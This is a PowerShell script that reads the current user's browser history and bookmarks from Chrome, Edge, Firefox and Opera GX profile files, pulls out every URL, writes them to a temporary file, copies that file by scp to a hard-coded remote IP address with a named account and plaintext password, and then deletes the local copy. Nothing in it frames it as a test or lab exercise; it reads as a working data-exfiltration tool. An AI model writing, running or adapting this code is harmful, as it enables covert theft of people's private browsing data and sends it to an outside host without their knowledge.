# Define paths for output and log files
$Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$OutputFile = "$env:TEMP\BrowserData_$Timestamp.txt"
$LogFile = "$env:TEMP\BrowserData_Log_$Timestamp.txt"

# Function to log messages
function Write-Log {
    param (
        [string]$Message
    )
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $LogFile -Value "[$Timestamp] $Message"
}

# Start logging
Write-Log "Script execution started."

try {
    # Collect browser data
    Write-Log "Collecting browser data."
    
    function Get-BrowserData {
        [CmdletBinding()]
        param (
            [Parameter(Position = 1, Mandatory = $True)]
            [string]$Browser,
            [Parameter(Position = 2, Mandatory = $True)]
            [string]$DataType
        )
        
        $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

        if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
        elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' ) { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
        elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data\Default\History" }
        elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' ) { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data\Default/Bookmarks" }
        elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" }
        elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" }
        elseif ($Browser -eq 'opera'   -and $DataType -eq 'bookmarks' ) { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks" }

        try {
            $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | ForEach-Object { ($_.Matches).Value } | Sort -Unique
            $Value | ForEach-Object {
                New-Object -TypeName PSObject -Property @{
                    User = $env:UserName
                    Browser = $Browser
                    DataType = $DataType
                    Data = $_
                }
            }
        } catch {
            Write-Log "Error reading browser data: $($_.Exception.Message)"
        }
    }

    # Collect data for all browsers
    Get-BrowserData -Browser "chrome" -DataType "history" >> $OutputFile
    Write-Log "Chrome history collected."
    
    Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $OutputFile
    Write-Log "Chrome bookmarks collected."
    
    Get-BrowserData -Browser "edge" -DataType "history" >> $OutputFile
    Write-Log "Edge history collected."
    
    Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $OutputFile
    Write-Log "Edge bookmarks collected."
    
    Get-BrowserData -Browser "firefox" -DataType "history" >> $OutputFile
    Write-Log "Firefox history collected."
    
    Get-BrowserData -Browser "opera" -DataType "history" >> $OutputFile
    Write-Log "Opera history collected."
    
    Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $OutputFile
    Write-Log "Opera bookmarks collected."
    
    # SCP the file to a remote server
    $RemoteUser = "Benjak617"
    $RemoteServer = "174.51.68.96"
    $RemotePath = "/"
    $Password = "Snowman1234!"
    $SCPCommand = "scp.exe"
    $scpArgs = @("$OutputFile", "$RemoteUser@${RemoteServer}:$RemotePath")

    Write-Log "Initiating SCP transfer."

    Start-Process -FilePath $SCPCommand -ArgumentList $scpArgs -Wait -ErrorAction Stop
    Write-Log "SCP transfer completed successfully."

    # Clean up
    Remove-Item -Path $OutputFile
    Write-Log "Temporary files cleaned up."

} catch {
    Write-Log "Script failed: $($_.Exception.Message)"
} finally {
    Write-Log "Script execution finished."
}
